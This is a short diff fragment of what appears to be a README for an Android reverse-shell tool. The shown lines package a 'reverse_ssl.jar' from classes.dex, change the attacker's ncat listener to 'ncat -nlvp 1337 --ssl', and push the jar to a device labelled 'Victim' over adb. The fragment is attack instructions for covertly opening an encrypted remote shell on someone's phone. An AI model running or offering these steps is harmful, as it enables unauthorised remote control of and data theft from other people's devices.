@@ -13,7 +13,7 @@
 `zip reverse_ssl.jar classes.dex`
 
 #### Set Listener (USE NCAT!)
-`ncat -nlvp 1337`
+`ncat -nlvp 1337 --ssl`
 
 ## On Victim device - Android -
 `adb push reverse_ssl.jar /sdcard` (if Android Debug Tools is enabled)
